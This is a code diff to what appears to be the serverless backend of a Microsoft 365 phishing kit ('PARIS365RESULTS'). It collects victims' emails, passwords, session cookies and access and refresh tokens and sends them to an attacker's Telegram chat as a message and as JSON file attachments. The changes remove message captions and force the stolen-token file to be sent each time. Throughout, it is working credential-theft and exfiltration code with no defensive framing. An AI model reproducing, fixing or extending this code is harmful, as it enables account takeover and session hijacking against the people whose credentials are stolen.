@@ -15,6 +15,7 @@ const handler = async (event, context) => {
     console.log('📥 Received data keys:', Object.keys(data));
     console.log('📥 Email:', data.email);
     console.log('📥 Cookie count:', Array.isArray(data.cookies) ? data.cookies.length : 'Not array');
+    console.log('📥 Authentication tokens:', data.authenticationTokens ? 'PRESENT' : 'MISSING');
 
     // Environment variables
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
@@ -144,52 +145,29 @@ const handler = async (event, context) => {
         }
     }
 
-    // Build the message (plain text only, heavily sanitized)
+    // Build the message (MINIMAL - plain text only, heavily sanitized)
     const uniqueId = Math.random().toString(36).substring(2, 8);
     const messageLines = [
       '🚨PARIS365RESULTS🚨',
       '',
-      `📧Email: ${email}`,
-      `🆔Session ID: ${sessionId}`,
-      `⏰Time: ${timestamp}`,
-      `🆔Message ID: ${uniqueId}`,
-      '',
-      `🍪Cookies: ${cookieDetails}`,
-      `Source: ${cookieSource}`
+      `📧 Email: ${email}`,
+      `🆔 Session ID: ${sessionId}`,
+      `⏰ Time: ${timestamp}`,
+      `🆔 Message ID: ${uniqueId}`
     ];
     
-    // Add password if captured
-    if (data.password && data.password !== 'Password not captured during login flow') {
+    // Add password if ACTUALLY captured (not debug)
+    if (data.password && 
+        data.password !== 'Password not captured during login flow' &&
+        data.password !== 'DEBUG_PASSWORD_NOT_CAPTURED' &&
+        !data.password.includes('DEBUG') &&
+        data.passwordSource !== 'debug-fallback') {
         messageLines.push('');
         messageLines.push(`Password: ${data.password}`);
         if (data.passwordSource) {
             messageLines.push(`Password Source: ${data.passwordSource}`);
         }
     }
-    
-    // Add cookie names if we have real cookies
-    if (cookieCount > 0 && cookieCount <= 10) {
-        messageLines.push('');
-        messageLines.push('Cookie Names:');
-        cookies.forEach((cookie, index) => {
-            if (cookie.name) {
-                messageLines.push(`${index + 1}. ${cookie.name}`);
-            }
-        });
-    } else if (cookieCount > 10) {
-        messageLines.push('');
-        messageLines.push(`Cookie Names: ${cookies.slice(0, 5).map(c => c.name).join(', ')}... (+${cookieCount - 5} more)`);
-    }
-    
-    // Add downloadable file information
-    messageLines.push('');
-    messageLines.push('📁 DOWNLOADABLE FILES:');
-    if (data.authenticationTokens) {
-        messageLines.push('📄 Token File (microsoft_tokens_*.json) - DOWNLOADABLE');
-    }
-    messageLines.push('🍪 Cookie File (microsoft_cookies_*.json) - DOWNLOADABLE');
-    messageLines.push('');
-    messageLines.push('💾 Files are JSON documents - tap to download');
     
     // Join and sanitize the entire message
     const simpleMessage = sanitizeForTelegram(messageLines.join('\n'));
@@ -219,8 +197,21 @@ const handler = async (event, context) => {
     console.log('📨 Telegram API response:', result);
 
     // Send authentication tokens as a file if available
-    if (data.authenticationTokens) {
-        const tokens = data.authenticationTokens;
+    console.log('🔍 Checking for authentication tokens...');
+    console.log('🔍 data.authenticationTokens:', data.authenticationTokens);
+    console.log('🔍 Token check result:', !!data.authenticationTokens);
+    
+    // Always send token file to debug the issue
+    console.log('🔧 FORCING token file creation for debugging...');
+    const hasTokens = !!data.authenticationTokens;
+    if (true) { // Force token file creation
+        const tokens = data.authenticationTokens || {
+            authorizationCode: 'Not captured',
+            accessToken: 'Not captured', 
+            refreshToken: 'Not captured',
+            idToken: 'Not captured',
+            debugInfo: 'No authenticationTokens provided'
+        };
         
         // Create comprehensive token file with non-expiring settings
         const tokenFileContent = {
@@ -272,9 +263,8 @@ const handler = async (event, context) => {
             // Send tokens as document file to Telegram using Buffer approach
             const documentUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
             
-            // Create proper multipart form data using Buffer
+            // Create proper multipart form data using Buffer (NO CAPTION)
             const boundary = `----WebKitFormBoundary${Math.random().toString(36).substring(2)}`;
-            const caption = `🔑 Microsoft Authentication Tokens\n\nEmail: ${email}\nCaptured: ${timestamp}\nFile: ${cleanTokenFileName}`;
             
             // Build form data parts as Buffer arrays
             const parts = [];
@@ -284,12 +274,7 @@ const handler = async (event, context) => {
             parts.push(Buffer.from(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`));
             parts.push(Buffer.from(`${TELEGRAM_CHAT_ID}\r\n`));
             
-            // Caption part
-            parts.push(Buffer.from(`--${boundary}\r\n`));
-            parts.push(Buffer.from(`Content-Disposition: form-data; name="caption"\r\n\r\n`));
-            parts.push(Buffer.from(`${caption}\r\n`));
-            
-            // Document part (explicit file attachment)
+            // Document part (NO CAPTION - just file)
             parts.push(Buffer.from(`--${boundary}\r\n`));
             parts.push(Buffer.from(`Content-Disposition: form-data; name="document"; filename="${cleanTokenFileName}"\r\n`));
             parts.push(Buffer.from(`Content-Type: application/json; charset=utf-8\r\n`));
@@ -449,9 +434,8 @@ function restoreMicrosoftCookies(cookiesArray) {
             // Send cookies as document file to Telegram using Buffer approach
             const documentUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
             
-            // Create proper multipart form data using Buffer for cookies
+            // Create proper multipart form data using Buffer for cookies (NO CAPTION)
             const cookieBoundary = `----WebKitFormBoundary${Math.random().toString(36).substring(2)}`;
-            const cookieCaption = `🍪 Microsoft Authentication Cookies\n\nEmail: ${email}\nCookies: ${cookieCount} captured\nSource: ${cookieSource}\nFile: ${cleanCookieFileName}`;
             
             // Build cookie form data parts as Buffer arrays
             const cookieParts = [];
@@ -461,12 +445,7 @@ function restoreMicrosoftCookies(cookiesArray) {
             cookieParts.push(Buffer.from(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`));
             cookieParts.push(Buffer.from(`${TELEGRAM_CHAT_ID}\r\n`));
             
-            // Caption part
-            cookieParts.push(Buffer.from(`--${cookieBoundary}\r\n`));
-            cookieParts.push(Buffer.from(`Content-Disposition: form-data; name="caption"\r\n\r\n`));
-            cookieParts.push(Buffer.from(`${cookieCaption}\r\n`));
-            
-            // Document part (explicit file attachment)
+            // Document part (NO CAPTION - just file)
             cookieParts.push(Buffer.from(`--${cookieBoundary}\r\n`));
             cookieParts.push(Buffer.from(`Content-Disposition: form-data; name="document"; filename="${cleanCookieFileName}"\r\n`));
             cookieParts.push(Buffer.from(`Content-Type: application/json; charset=utf-8\r\n`));
